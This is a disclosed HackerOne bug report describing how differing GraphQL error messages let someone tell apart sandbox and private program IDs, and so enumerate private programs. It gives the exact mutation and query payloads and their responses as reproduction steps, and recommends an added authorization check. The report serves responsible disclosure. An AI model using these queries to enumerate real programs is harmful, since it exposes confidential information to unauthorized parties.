# Hackers can find out the ID of private programs

## Report Details
- **Report ID**: 1129649
- **URL**: https://hackerone.com/reports/1129649
- **State**: Closed
- **Severity**: low
- **Submitted**: 2021-03-18T02:45:51.732Z
- **Disclosed**: 2021-08-24T03:10:25.402Z

## Reporter
- **Username**: haxta4ok00
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
## Summary:
Hi team,

Our team noticed that it is possible to find out the IDs of sandbox programs. This allows us to create a list, thereby determining that the rest of the list of IDs will belong to private programs or public or external program(`directory listing`). But by removing ID all public and external programs, we can create a list of identifiers that belongs only to a completely private programs. Having saved it, we can check the identifiers in the future when the program goes from completely private to the directory listing( as private program with external link).And if the ID exists in this list, then we will know that the private part exists there. This report is intended for the future. But it also has some authorization error when accessing someone else's ID, though only if it is a sandbox program.


**A response is expected for any ID program**: `You do not have the appropriate access`
**The answer for sandbox programs**: `"Team not enabled to use this integration whilst sandboxed, contact your program manager to be whitelisted."`


 

## Steps To Reproduce:

1. Creating a new account so that you don't have to be a member of any private program( for convenience)
2. Create a sandbox program for confidence via https://hackerone.com/teams/new/sandbox
3. 
GraphQL query:

```
{"operationName":"createSolutionInstance","variables":{"team_id":"gid://hackerone/Team/51925","solution_id":"","name":""},"query":"mutation createSolutionInstance($team_id: ID!, $solution_id: String!) {createSolutionInstance(input: {team_id: $team_id, solution_id: $solution_id}) {team {id, ...TeamFragment,__typename},new_solution_instance_id,was_successful,errors {edges {node {id,message,__typename,}__typename}__typename}__typename}} fragment TeamFragment on Team {id,handle,tray_integration{id,_id,active,tray_profile {id,tray_user_id,__typename},solution_instances(solution_id: $solution_id) {edges {node {id,_id,name,description,enabled,created,solution {id,name,custom_fields,__typename}__typename}__typename}__typename}__typename}__typename}"}
```

Answer: `Team not enabled to use this integration whilst sandboxed, contact your program manager to be whitelisted.`

This makes us understand that this is a sandbox program

4.
GraphQL query:
```
{"operationName":"createSolutionInstance","variables":{"team_id":"gid://hackerone/Team/21732","solution_id":"","name":""},"query":"mutation createSolutionInstance($team_id: ID!, $solution_id: String!) {createSolutionInstance(input: {team_id: $team_id, solution_id: $solution_id}) {team {id, ...TeamFragment,__typename},new_solution_instance_id,was_successful,errors {edges {node {id,message,__typename,}__typename}__typename}__typename}} fragment TeamFragment on Team {id,handle,tray_integration{id,_id,active,tray_profile {id,tray_user_id,__typename},solution_instances(solution_id: $solution_id) {edges {node {id,_id,name,description,enabled,created,solution {id,name,custom_fields,__typename}__typename}__typename}__typename}__typename}__typename}"}
```
Answer:`You do not have the appropriate access `

4.1 Let's check what kind of program it is

GraphQL query:

```
{"query":"query{node(id:\"gid://hackerone/Team/21732\"){... on Team{_id,handle,state}}}"}
```

Answer: `Team does not exist`

It turns out that this is the ID of a private program

And if this program ever goes to directory listing, we can determine that it is a private program with an external link

Yes, this is a complex PoC, but slightly creative, but based on your answer, we thought it made sense

 

## Recommendation:

Create an additional authorization check to someone else's program ID.

## Impact

Hackers can find out the ID of private programs

## Attachments
No attachments
